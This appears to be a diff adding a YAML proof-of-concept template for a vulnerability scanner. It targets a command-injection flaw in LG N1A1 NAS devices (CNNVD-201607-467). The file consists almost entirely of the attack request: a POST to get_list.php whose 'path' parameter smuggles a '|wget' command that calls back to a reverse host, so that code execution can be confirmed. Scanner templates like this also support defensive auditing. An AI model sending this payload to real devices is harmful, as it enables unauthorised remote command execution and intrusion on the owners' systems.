@@ -1,0 +1,24 @@
+name: poc-yaml-lg-n1a1-nas-cnnvd-201607-467-rce
+manual: true
+transport: http
+set:
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /familycast/interface/php/get_list.php
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: mode=Filelist&path='|wget {{reverseURL}}'
+        expression: reverse.wait(5)
+expression: r1()
+detail:
+    author: test007
+    links:
+        - https://vul.wangan.com/a/CNNVD-201607-467
+    vulnerability:
+        id: CT-338803
+        level: low
